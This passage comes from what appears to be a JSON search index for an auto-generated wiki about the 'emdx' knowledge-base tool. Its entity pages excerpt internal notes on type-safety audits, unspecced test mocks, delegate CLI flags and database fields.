<li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Synthesis of 5 outputs (error: FOREIGN KEY constraint failed)</p> <p>...... [23:47:49] \ud83d\udcc4 Tool result: emdx/agents/base.py:49:    def from_db_row(cls, row: Dict[str, Any]) -&gt; 'AgentConfig': emdx/workflow... [23:47:53] \ud83d\udcd6 Using tool: Read [23:47:54] \ud83d\udcd6 Using tool: Read [23:47:54] \ud83d\udcc4 Tool result:      1\u2192\"\"\"Export destination handlers for e...</p> </li> </ul>"},{"location":"entities/dictstr-any/#type-safety","title":"Type Safety","text":"Issue Count Missing return type annotations (public functions) 50+ <code>Dict[str, Any]</code> instead of TypedDict 25+ Mixed <code>Optional[T]</code> vs <code>T | None</code> syntax 47 files"},{"location":"entities/dictstr-any/#current-state","title":"Current State","text":""},{"location":"entities/dictstr-any/#related-entities","title":"Related Entities","text":"<ul> <li><code>executionresult.to_dict()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=4.2)</li> <li><code>typeddict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.2)</li> <li><code>emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.2)</li> <li><code>doc_db: any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.2)</li> <li><code>total=false</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.2)</li> <li><code>to_dict()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.2)</li> <li><code>executionresultdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.2)</li> <li><code>type system audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.2)</li> <li><code>doc_db</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.0)</li> <li><code>*args: any, **kwargs: any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.0)</li> </ul>"},{"location":"entities/distillservice/","title":"distillservice","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/distillservice/#documents-8","title":"Documents (8)","text":"<ul> <li>#6743 wiki-synthesis-research   Section: Integration with Existing emdx Infrastructure <p>...erseded tagging. Wiki generation is a quality upgrade to compact's synthesis.</p> </li> <li><code>DistillService</code> \u2014 audience-aware synthesis could inform wiki tone (docs audience = wiki style).</li> <li> <p><code>wikify_service</code> \u2014 post-synthesis, run title-match wikification on the new a...</p> </li> <li> <p>#6719 Wiki Generation Quality Assessment &amp; Feedback Loops   Section: Context</p> <p>emdx generates wiki articles from document clusters via LLM synthesis (using <code>SynthesisService</code> and <code>DistillService</code>). This research covers quality assessment, feedback loops, and improvement mechanisms for auto-generated content.</p> </li> <li> <p>#6717 Wiki Generation Architecture Research [4/10]   Section: 8. Integration with Existing Code</p> <p>...ic_labels()<code>| Generate article titles from clusters | |</code>synthesis_service.py<code>\u2014</code>DistillService<code>| Adapt for article synthesis (</code>audience=docs<code>) | |</code>core.py:257-280<code>\u2014 save flow | Add</code>detect_affected_articles()<code>after entity wikification | |</code>document_entitie...</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Symbols NOT Added (and why)</p> <p>...e<code>,</code>SearchQuery`** \u2014 only lazy-imported inside functions</p> </li> <li><code>SynthesisService</code>, <code>DistillService</code> \u2014 only lazy-imported inside functions</li> <li><code>FileWatcher</code> \u2014 requires watchdog (optional dep)</li> <li><code>AskService</code> \u2014 only lazy-imported inside functions</li> <li> <p>**`documen...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Test Suite</p> <p>...g</p> </li> <li>5 core domain classes (<code>UnifiedExecutor</code>, <code>CliExecutor</code>, <code>SimilarityService</code>, <code>DistillService</code>, <code>psutil.Process</code>) are mocked without specs in high-traffic tests</li> <li> <p>A rename or signature change to any mocked method would produce **silently passing tests with br...</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P0 \u2014 HIGH RISK: Mocks of domain classes with evolving APIs</p> </li> <li>File: <code>test_distill.py</code> (6 instances)</li> <li>Risk: Tests mock <code>synthesize_documents()</code>. If <code>DistillService</code> changes its API, tests remain green.</li> <li> <p>Fix: `Ma...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: NOT Using synthesis_service.py</p> <p><code>synthesis_service.py</code> contains:</p> </li> <li><code>DistillService</code> \u2014 Used by <code>emdx distill</code> for audience-aware synthesis</li> <li><code>SynthesisService</code> \u2014 Used by <code>emdx compact</code> for merging related documents</li> </ul>"},{"location":"entities/distillservice/#4-mock_service-magicmock-standing-in-for-distillservice","title":"4. <code>mock_service = MagicMock()</code> standing in for <code>DistillService</code>","text":""},{"location":"entities/distillservice/#related-entities","title":"Related Entities","text":"<ul> <li><code>spec=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>psutil.process</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/doc/","title":"--doc","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/doc/#documents-10","title":"Documents (10)","text":"<ul> <li>#6842 Delegate: Add a --task flag to the delegate command that sets the EMDX <p>...ded <code>--task</code> CLI option** \u2014 <code>typer.Option</code> accepting <code>int | None</code>, placed next to <code>--doc</code> for consistency</p> </li> <li>Added <code>task_flag</code> parameter to <code>_run_single()</code> and <code>_run_parallel()</code> \u2014 threaded through all execution paths</li> <li> <p>Override logic in `_run_si...</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...| <code>--quiet</code> | <code>-q</code> | \u2014 | Suppress metadata on stderr (just content on stdout) | | <code>--doc</code> | <code>-d</code> | INTEGER | Document ID to use as input context | | <code>--pr</code> | \u2014 | \u2014 | Instruct agent to create a PR (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | \u2014 | Commit and...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...4\u20131076 | Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | **Parallel orche...</p> </li> <li> <p>#6677 Delegate Slimming Research [2/3]   Section: Conflict 5: \"Search emdx before starting work\" (User CLAUDE.md, lines 72\u201375)</p> <p>...Delegates should focus on their assigned task with the context they're given (via <code>--doc</code>). Browsing the KB for related work is a human-session concern. A delegate searching around before starting burns tokens and may get distracted by tangential results...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Core Task Options</p> <p>...l | | <code>--quiet</code> | <code>-q</code> | Suppress metadata on stderr (just content on stdout) | | <code>--doc</code> | <code>-d</code> | Document ID to use as input context for all tasks |</p> </li> <li> <p>#6556 Delegate: --memory N flag implementation   Section: 3. Memory Injection</p> <p>Memory context is injected after <code>--doc</code> resolution and before task execution (lines 1183-1190): ```python if memory and memory &gt; 0:     memory_context = _get_memory_context(memory)     if memory_context:...</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: What Works Well Today</p> <p>..., <code>task active</code>, <code>task done</code> \u2014 simple agent work coordination</p> </li> <li>Doc Context: <code>--doc</code> flag passes KB content to agents; results persist back to KB</li> <li> <p>PR Automation: <code>--pr</code> and <code>--worktree</code> flags enable isolated, parallel code changes</p> </li> <li> <p>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2]   Section: Overview</p> <p>Design a <code>--context 'query'</code> flag that auto-selects relevant documents and injects them as context for delegate tasks. This builds on the existing <code>--doc 42</code> mechanism but uses search to discover relevant documents automatically.</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...<code>--synthesize</code> flag</p> </li> <li><code>--worktree</code> flag</li> <li><code>--pr</code> flag (implies worktree)</li> <li><code>--doc</code> flag for document context</li> <li> <p>Error handling (no tasks, mutually exclusive flags)</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Issue 2: doc_id Usually NULL for Delegate Executions (LOW)</p> <p>But delegate only sets it when using <code>--doc</code> flag (<code>delegate.py:628-632</code>). For regular delegate commands, <code>doc_id=None</code>.</p> </li> </ul>"},{"location":"entities/doc/#related-entities","title":"Related Entities","text":"<ul> <li><code>--flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>save-output.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>emdx_task_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>--model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>session-end.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>options</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>--epic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>subprocess.run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/docdb-any/","title":"doc_db: any","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-15</p>"},{"location":"entities/docdb-any/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>ABC-level <code>Any</code> propagates widely \u2014 The <code>activity_items.py</code> <code>doc_db: Any</code> parameter affects 4 subclasses \u00d7 2 methods = 8 signatures. Fixing the ABC fixes everything downstream.</li> </ol> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]</p> </li> </ul>"},{"location":"entities/docdb-any/#fixable-any-usages-prioritized","title":"Fixable <code>Any</code> Usages \u2014 Prioritized","text":""},{"location":"entities/docdb-any/#priority-1-high-impact-used-in-interfacesabcs","title":"Priority 1: High Impact (Used in Interfaces/ABCs)","text":""},{"location":"entities/docdb-any/#1-activityactivity_itemspy-doc_db-any-parameter-6-occurrences","title":"1. <code>activity/activity_items.py</code> \u2014 <code>doc_db: Any</code> parameter (6 occurrences)","text":"<p>Lines: 53, 58, 89, 125, 177, 240, 306, 310</p> <p>The <code>doc_db</code> parameter ...</p> <ul> <li>#6515 Any removal Phase 2: UI TypedDicts   Section: Remaining <code>Any</code> Usages <p>...<code>**kwargs: Any</code> - Standard pattern for Textual widget constructor kwargs</p> </li> <li><code>doc_db: Any</code> - Database interface parameter in abstract methods (would require Protocol or TYPE_CHECKING import to fix properly)</li> <li> <p>Timer/stream objects - `_auto_refresh_t...</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 1-6: <code>doc_db: Any</code> parameter in abstract methods</p> <p>Current signatures (lines 51, 56, 86, 122, 179, 221, 285, 289, 330, 393, 464, 468):</p> </li> </ul> <pre><code>async def load_children(self, doc_db: Any) -&gt; list[\"ActivityItem\"]:\nasync def get_preview_content(self, doc_db: Any) -&gt; tuple[str, str]:\n</code></pre> <ul> <li> <p>#6436 Any/None typing audit [5/5]   Section: activity/activity_items.py</p> <p>...---------|--------------|----------------------| | <code>load_children.doc_db</code> | L51 | <code>doc_db: Any</code> | \u2705 Yes | <code>DocumentService \\| None</code> | | <code>get_preview_content.doc_db</code> | L56 | <code>doc_db: Any</code> | \u2705 Yes | <code>DocumentService \\| None</code> | | <code>cascade_run</code> | L152 | `dict[str,...</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 1. Activity Items \u2014 <code>doc_db: Any</code> (6 occurrences)</p> <p>Problem: All <code>load_children()</code> and <code>get_preview_content()</code> methods accept <code>doc_db: Any</code>, making the API contract unclear. This type flows through multiple modules.</p> </li> </ul>"},{"location":"entities/docdb-any/#5-protocol-pattern-for-db-access-high-priority","title":"5. Protocol Pattern for DB Access (High Priority)","text":"<p><code>doc_db: Any</code> parameter appears in 8 abstract methods in <code>activity_items.py</code>.</p>"},{"location":"entities/docdb-any/#related-entities","title":"Related Entities","text":"<ul> <li><code>inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety benefits</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/docdb/","title":"doc_db","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/docdb/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Lazy-loaded services are the #1 source of <code>Any</code> in <code>ui/</code> \u2014 <code>_search_service</code>, <code>_embedding_service</code>, <code>doc_db</code> parameters all use <code>Any</code> to avoid circular imports. The fix is always the same: <code>TYPE_CHECKING</code> guard + forward reference.</li> </ol> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 1. <code>activity/activity_items.py</code> \u2014 <code>doc_db: Any</code> parameter (6 occurrences)</p> <p>The <code>doc_db</code> parameter on <code>ActivityItem.load_children()</code> and <code>get_preview_content()</code> is typed as <code>Any</code> but is always an <code>SQLiteDatabase</code> instance.</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 2. Updated <code>emdx/ui/activity/activity_items.py</code></p> <p>...nt]` comments for dataclass default factory compatibility</p> </li> <li> <p>Kept <code>Any</code> import for <code>doc_db</code> parameter in abstract methods (still needed for database interface)</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 1. Line 51: <code>load_children</code> method parameter</p> <p>Current:</p> </li> </ul> <pre><code>async def load_children(self, doc_db: Any) -&gt; list[\"ActivityItem\"]:\n</code></pre> <ul> <li>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 1-6: <code>doc_db: Any</code> parameter in abstract methods <p>Current signatures (lines 51, 56, 86, 122, 179, 221, 285, 289, 330, 393, 464, 468):</p> </li> </ul> <pre><code>async def load_children(self, doc_db: Any) -&gt; list[\"ActivityItem\"]:\nasync def get_preview_content(self, doc_db: Any) -&gt; tuple[str, str]:\n</code></pre> <ul> <li>#6370 Mypy Type Error Fixes (Issue #556)   Section: Files Fixed (6 files, +207/-139 lines) </li> <li>Changed <code>List[\"ActivityItem\"]</code> to <code>list[\"ActivityItem\"]</code></li> <li>Changed <code>Dict[str, Any]</code> to <code>dict[str, Any]</code></li> <li> <p>Added <code>Any</code> type annotation for <code>doc_db</code> parameter</p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Duck typing without Protocol</p> <p>...]<code>- Same issue | |</code>emdx/ui/activity/activity_items.py:51<code>|</code>load_children(self, doc_db)<code>-</code>doc_db<code>parameter has no type annotation | |</code>emdx/ui/activity/activity_items.py:56<code>|</code>get_preview_content(self, doc_db)<code>- Same issue | |</code>emdx/ui/text_areas....</p> </li> </ul>"},{"location":"entities/docdb/#5-protocol-pattern-for-db-access-high-priority","title":"5. Protocol Pattern for DB Access (High Priority)","text":"<p><code>doc_db: Any</code> parameter appears in 8 abstract methods in <code>activity_items.py</code>.</p>"},{"location":"entities/docdb/#uiactivityactivity_itemspy-28-errors-0","title":"ui/activity/activity_items.py (28 errors \u2192 0)","text":""},{"location":"entities/docdb/#related-entities","title":"Related Entities","text":"<ul> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>widget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/docid/","title":"doc_id","text":"<p>Type: tech_term | Mentioned in: 19 documents | First seen: 2026-02-13</p>"},{"location":"entities/docid/#documents-19","title":"Documents (19)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...SON output structure showing all fields from <code>SingleResult.to_dict()</code>: <code>task_id</code>, <code>doc_id</code>, <code>output_doc_id</code>, <code>execution_id</code>, <code>exit_code</code>, <code>success</code>, <code>duration_seconds</code>, <code>duration</code></p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Par...</p> </li> <li> <p>#6710 Delegate: Design a unified dashboard data model. Given that we want to [4/4]   Section: The Core Insight: <code>ActivityItem</code> IS the Dashboard Item</p> <p>...ready provides the right abstraction \u2014 <code>item_id</code>, <code>title</code>, <code>timestamp</code>, <code>status</code>, <code>doc_id</code>, <code>cost</code>, plus virtual properties <code>item_type</code>, <code>type_icon</code>, <code>status_icon</code>, and <code>get_preview_content()</code>. Documents and executions are already subclasses. The fix is s...</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...--|------|---------| | <code>id</code> | INTEGER PK AUTOINCREMENT | Numeric execution ID | | <code>doc_id</code> | INTEGER (nullable) | Associated document, nullable for standalone delegates | | <code>doc_title</code> | TEXT NOT NULL | Human-readable title of the execution | | <code>status</code> |...</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 21. <code>command_palette/palette_screen.py:147</code> \u2014 <code>CommandPaletteScreen.__init__(result: dict[str, Any])</code></p> <p>...<code>which returns</code>dict[str, Any] | None<code>. The dict shape has known keys (</code>action<code>,</code>doc_id<code>,</code>command_id<code>,</code>tag<code>). Could define a</code>PaletteAction` TypedDict but the structure is a discriminated union. Acceptable as-is unless a broader palette result typ...</p> </li> <li> <p>#6569 Delegate: Check the KB save path \u2014 trace from UnifiedExecutor output t [3/3]   Section: Summary</p> <p>No duplicate save risk exists in the current implementation. The agent and fallback save paths are mutually exclusive due to the conditional check on <code>doc_id</code>.</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: Flow Summary</p> <p>...CLI          \u2502       \u2502          \u2502       \u25bc          \u2502   Agent output saved to KB \u2192 doc_id          \u2502          \u25bc     Collect all successful results          \u2502          \u25bc     Build synthesis prompt with all task outputs          \u2502          \u25bc     _run_single...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>..., <code>pipeline_name</code>, <code>pipeline_display_name</code>, <code>current_stage</code>, <code>initial_doc_title</code>, <code>doc_id</code>, <code>error_message</code>.</p> </li> <li> <p>#6507 None Type Analysis [7/7]   Section: Summary Statistics</p> <p>...3 | 3 | 0 | Config paths and parsing | | activity_items.py | 5 | 5 | 0 | Optional doc_id on base class | | git_ops.py | 4 | 4 | 0 | Optional paths for git commands | | structured_logger.py | 4 | 4 | 0 | Optional context dicts | | git.py | 2 | 2 | 0 | Git...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>...None = None,     task_type: str = \"single\",     status: str = \"active\",     source_doc_id: int | None = None,     parent_task_id: int | None = None,     seq: int | None = None,     tags: str | None = None,     epic_key: str | None = None, ) -&gt; int | None:...</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: 1. <code>emdx/commands/delegate.py</code></p> <p>...| None = None,     task_type: str = \"single\",     status: str = \"open\",     source_doc_id: int | None = None,     parent_task_id: int | None = None,     seq: int | None = None,     tags: str | None = None,     epic_key: str | None = None, ) -&gt; int | None:...</p> </li> <li> <p>#6487 Any Type Removal Analysis [3/5]   Section: 2. Line 147: <code>ResultSelected</code> message result parameter</p> <p>class PaletteActionResult(TypedDict):     action: str  # \"command\", \"view_document\", \"search_tag\"     command_id: NotRequired[str]     doc_id: NotRequired[int]     tag: NotRequired[str]</p> </li> <li> <p>#6403 Bug Fix PR Reviews [1/6]   Section: Edge Cases Analysis</p> <p>...dge Case Concern (MINOR)</p> </li> <li>If a valid stage upsert is attempted on a non-existent <code>doc_id</code>, the INSERT will succeed (SQLite doesn't enforce FK by default unless <code>PRAGMA foreign_keys=ON</code>).</li> <li> <p>This is existing behavior not introduced by this PR.</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: <code>doc_id</code> vs <code>document_id</code></p> Usage Location <code>doc_id</code> <code>services/cascade_service.py:40</code>, <code>models/executions.py:17</code> <code>document_id</code> <code>services/auto_tagger.py:191</code>, throughout tag operations </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: DEBT-8: Standardize CLI Interfaces</p> <p>...Fixing silent failures (except Exception: pass) to log errors instead</p> </li> <li> <p>Verified doc_id parameter types are appropriate for their use cases</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: High Priority Findings</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: CRITICAL SEVERITY (Breaking Contract Risks)</p> </li> <li><code>core.py:view()</code> - <code>identifier: 